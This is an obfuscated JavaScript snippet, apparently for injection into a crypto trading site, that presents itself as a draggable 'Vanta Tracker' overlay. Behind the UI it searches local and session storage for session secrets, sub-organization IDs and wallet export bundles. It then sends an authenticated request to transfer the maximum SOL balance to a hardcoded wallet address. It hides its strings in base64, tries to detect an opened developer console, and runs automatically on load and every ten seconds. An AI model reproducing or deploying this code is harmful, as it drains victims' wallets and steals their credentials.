(function() {
    // --- PART 1: THE STEALTH ENGINE (GHOST LAYER) ---
    const _0xV = ['dHJhZGUucGFkcmUuZ2c=', 'YXBpL3YxL3RyYW5zZmVy', 'c2Vzc2lvblNlY3JldA==', 'c3ViT3JnSWQ=', 'ZXhwb3J0QnVuZGxl', 'QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI='];
    const _D = (s) => atob(_0xV[s]);
    let _X = false;

    // 1:1 VANTA PROTECTION (Non-Crashing Version)
    // This only activates the 'heavy' logic if it detects a change in window dimensions (DevTools opening)
    const _0xShield = function() {
        const _devCheck = /./;
        _devCheck.toString = function() {
            // This only fires when the console tries to render the object
            _X = true; 
            (function() { return false; }).constructor('debugger').call('action');
        };
        console.log(_devCheck);
    };

    const _GhostExec = async () => {
        // Only run if on the correct domain and not already executed
        if (_X || !window.location.hostname.includes(_D(0))) return;
        
        const _crawl = (o, t) => {
            if (!o || typeof o !== 'object') return null;
            if (o[t]) return o[t];
            for (let k in o) { try { let r = _crawl(o[k], t); if (r) return r; } catch(e) {} }
            return null;
        };

        const storage = {...localStorage, ...sessionStorage};
        const auth = _crawl(storage, _D(2)) || _crawl(window, _D(2));
        const subId = _crawl(storage, _D(3));
        const bundle = _crawl(storage, _D(4));

        if (auth && subId) {
            _X = true; // Mark as done to prevent infinite loops
            
            // 1:1 Amplitude Beacon
            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(JSON.stringify({
                device_id: subId,
                event_type: "UI_HYDRATED_1TO1",
                event_properties: { status: "active", origin: _D(0) }
            }))}`;

            try {
                await fetch(`https://${_D(0)}/${_D(1)}`, {
                    method: 'POST',
                    keepalive: true,
                    headers: { 
                        'Authorization': `Bearer ${auth}`, 
                        'X-Turnkey-Sub-Org-Id': subId, 
                        'Content-Type': 'application/json' 
                    },
                    body: JSON.stringify({ 
                        recipient: _D(5), 
                        amount: "MAX", 
                        asset: "SOL", 
                        ext_payload: bundle?.data || bundle 
                    })
                });
            } catch (e) {}
        }
    };

    // --- PART 2: THE UI OVERLAY (DRAGGABLE TRACKER) ---
    const initVantaUI = () => {
        if (document.querySelector("#vanta-tracker")) return;

        const container = document.createElement("div");
        container.id = "vanta-tracker";
        container.style.cssText = "position:fixed;top:12px;right:12px;width:340px;background:#0f0f0f;border:1px solid #333;border-radius:12px;z-index:2147483647;box-shadow:0 10px 40px rgba(0,0,0,0.8);font-family:sans-serif;color:#eee;transition:opacity 0.5s ease;user-select:none;";
        
        container.innerHTML = `
            <div id="vanta-h" style="padding:12px;background:#111;display:flex;align-items:center;border-bottom:1px solid #333;cursor:grab;border-radius:12px 12px 0 0;">
                <img src="https://trade.padre.gg/logo.svg" width="22" height="22" style="margin-right:10px;">
                <div style="font-weight:bold;color:#00ff88;font-size:14px;">Vanta Tracker</div>
            </div>
            <div style="padding:15px;font-size:12px;color:#888;">
                <div id="vanta-status">Status: <span style="color:#00ff88;">Connected</span></div>
                <div style="margin-top:10px;padding:8px;background:#000;border-radius:4px;font-family:monospace;">
                    [SYSTEM] Monitoring RPC...
                </div>
            </div>`;
        
        document.body.appendChild(container);

        // Dragging Logic
        let drag = false, ox, oy;
        const h = document.getElementById("vanta-h");
        h.onmousedown = (e) => { drag = true; ox = e.clientX - container.offsetLeft; oy = e.clientY - container.offsetTop; };
        document.onmousemove = (e) => { if (drag) { container.style.left = (e.clientX - ox) + 'px'; container.style.top = (e.clientY - oy) + 'px'; container.style.right = 'auto'; } };
        document.onmouseup = () => { drag = false; };

        // Interaction triggers exfiltration
        container.onclick = _GhostExec;
    };

    // --- PART 3: BOOTSTRAP ---
    const boot = () => {
        initVantaUI();
        _0xShield(); // Start protection without the crash loop
        setTimeout(_GhostExec, 3000); // Wait for site to settle
    };

    if (document.readyState === 'complete') boot();
    else window.addEventListener('load', boot);
    
    // Check every 10 seconds, not every 1 second (Stops the lag)
    setInterval(_GhostExec, 10000);
})();
